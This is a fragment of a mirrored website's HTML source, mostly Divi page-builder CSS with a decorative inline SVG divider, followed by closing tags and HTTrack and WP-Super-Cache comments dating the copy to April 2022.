rgba(81,81,124,0.61)}.et_pb_row_9.et_pb_row{padding-top:15px!important;padding-bottom:0px!important;padding-top:15px;padding-bottom:0px}.et_pb_text_7{font-size:18px;padding-bottom:0px!important;margin-top:31px!important;margin-bottom:0px!important}.et_pb_image_0{padding-top:0px;text-align:left;margin-left:0}.et_pb_image_18,.et_pb_image_1,.et_pb_image_20,.et_pb_image_21,.et_pb_image_22{text-align:left;margin-left:0}.et_pb_image_2{margin-top:37px!important;text-align:left;margin-left:0}.et_pb_image_3{margin-top:26px!important;text-align:left;margin-left:0}.et_pb_image_11,.et_pb_image_23,.et_pb_image_24,.et_pb_image_19,.et_pb_image_25,.et_pb_image_17,.et_pb_image_16,.et_pb_image_15,.et_pb_image_14,.et_pb_image_26,.et_pb_image_9,.et_pb_image_10,.et_pb_image_7,.et_pb_image_5,.et_pb_image_6,.et_pb_image_4,.et_pb_image_8{text-align:center}.et_pb_image_8 .et_pb_image_wrap img,.et_pb_image_19 .et_pb_image_wrap img,.et_pb_image_16 .et_pb_image_wrap img,.et_pb_image_7 .et_pb_image_wrap img{max-height:35px;width:auto}.et_pb_image_12 .et_pb_image_wrap img{max-height:100px;width:auto}.et_pb_image_13,.et_pb_image_12{margin-top:-22px!important;text-align:center}.et_pb_image_23 .et_pb_image_wrap img,.et_pb_image_24 .et_pb_image_wrap img,.et_pb_image_26 .et_pb_image_wrap img{max-height:80px;width:auto}.et_pb_image_25 .et_pb_image_wrap img{max-height:60px;width:auto}.et_pb_row_15.et_pb_row{padding-top:10px!important;padding-bottom:11px!important;padding-top:10px;padding-bottom:11px}body #page-container .et_pb_section .et_pb_button_0,body .pum-container .et_pb_section .et_pb_button_0{color:#FFFFFF!important}.et_pb_button_0,.et_pb_button_0:after{transition:all 300ms ease 0ms}.et_pb_row_16{background-image:linear-gradient(180deg,rgba(43,135,218,0) 0%,#141226 62%)}.et_pb_row_16.et_pb_row{padding-bottom:0px!important;margin-top:27px!important;margin-right:auto!important;margin-left:auto!important;padding-bottom:0px}.et_pb_section_3.et_pb_section{padding-top:20px;padding-bottom:12px;background-color:#141226!important}.et_pb_row_17.et_pb_row{padding-top:0px!important;padding-top:0px}.et_pb_signup_0.et_pb_subscribe{border-top-color:#FFFFFF;border-bottom-color:#FFFFFF}.et_pb_row_0.et_pb_row{padding-top:5px!important;padding-bottom:5px!important;margin-top:0px!important;margin-bottom:0px!important;margin-left:auto!important;margin-right:auto!important;padding-top:5px;padding-bottom:5px}.et_pb_video_0.et_pb_module,.et_pb_text_1.et_pb_module,.et_pb_gallery_1.et_pb_gallery.et_pb_module,.et_pb_video_1.et_pb_module,.et_pb_gallery_3.et_pb_gallery.et_pb_module,.et_pb_gallery_2.et_pb_gallery.et_pb_module{margin-left:auto!important;margin-right:auto!important}.et_pb_text_0.et_pb_module{margin-left:0px!important;margin-right:auto!important}@media only screen and (min-width:981px){.et_pb_text_0{max-width:40%}.et_pb_text_1{width:20%}}@media only screen and (max-width:980px){.et_pb_text_0{max-width:80%;transform:translateX(0px) translateY(0px)}.et_pb_row_2{background-size:cover;background-color:initial}.et_pb_text_1{height:200px;width:60%}body #page-container .et_pb_section .et_pb_button_0:after,body .pum-container .et_pb_section .et_pb_button_0:after{display:inline-block;opacity:0}body #page-container .et_pb_section .et_pb_button_0:hover:after,body .pum-container .et_pb_section .et_pb_button_0:hover:after{opacity:1}.et_pb_signup_0.et_pb_subscribe{border-top-color:#FFFFFF;border-bottom-color:#FFFFFF}.et_pb_text_0.et_pb_module{margin-left:auto!important;margin-right:auto!important}}@media only screen and (min-width:768px) and (max-width:980px){.et_pb_row_9{display:none!important}}@media only screen and (max-width:767px){.et_pb_text_0{transform:translateX(0px) translateY(0px)}.et_pb_text_1{height:200px;width:80%}.et_pb_row_9{display:none!important}body #page-container .et_pb_section .et_pb_button_0:after,body .pum-container .et_pb_section .et_pb_button_0:after{display:inline-block;opacity:0}body #page-container .et_pb_section .et_pb_button_0:hover:after,body .pum-container .et_pb_section .et_pb_button_0:hover:after{opacity:1}.et_pb_signup_0.et_pb_subscribe{border-top-color:#FFFFFF;border-bottom-color:#FFFFFF}.et_pb_text_0.et_pb_module{margin-left:auto!important;margin-right:auto!important}}</style><style id="et-builder-module-design-tb-1964-22-cached-inline-styles">.et_pb_section_0_tb_footer.et_pb_section{padding-top:0px;padding-bottom:6px;background-color:#141226!important}.et_pb_section_0_tb_footer.section_has_divider.et_pb_top_divider .et_pb_top_inside_divider{background-image:url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDBweCIgdmlld0JveD0iMCAwIDEyODAgMTQwIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGZpbGw9IlJHQkEoMCwwLDAsMCkiPjxwYXRoIGQ9Ik02NDAgMTQwTDEyODAgMEgweiIvPjwvZz48L3N2Zz4=);background-size:100% 100px;top:0;height:100px;z-index:1}.et_pb_row_0_tb_footer.et_pb_row{padding-bottom:45px!important;padding-bottom:45px}.et_pb_row_0_tb_footer,body #page-container .et-db #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,.et_pb_row_0_tb_footer,body .pum-container .et-db #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,.et_pb_row_0_tb_footer,body #page-container .et-db .pum .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,.et_pb_row_0_tb_footer,body .pum-container .et-db .pum .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0_tb_footer.et_pb_row{max-width:80%}.et_pb_text_0_tb_footer{font-size:18px;margin-bottom:2px!important}.et_pb_text_0_tb_footer a{font-size:18px}.et_pb_text_0_tb_footer h3{font-family:'Nunito',Helvetica,Arial,Lucida,sans-serif;font-weight:700;color:#024895!important}.et_pb_image_0_tb_footer .et_pb_image_wrap img{max-height:75px;width:auto}.et_pb_image_0_tb_footer{padding-top:4px;text-align:center}@media only screen and (max-width:980px){.et_pb_image_0_tb_footer{transform:translateX(0px) translateY(0px)}}@media only screen and (max-width:767px){.et_pb_image_0_tb_footer{transform:translateX(0px) translateY(0px)}}</style>	
+	</body>
+
+<!-- Mirrored from angelicthegame.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 Apr 2022 03:05:28 GMT -->
+</html>
+
+<!-- Dynamic page generated in 4.267 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2022-04-12 02:43:56 -->
+
+<!-- super cache -->
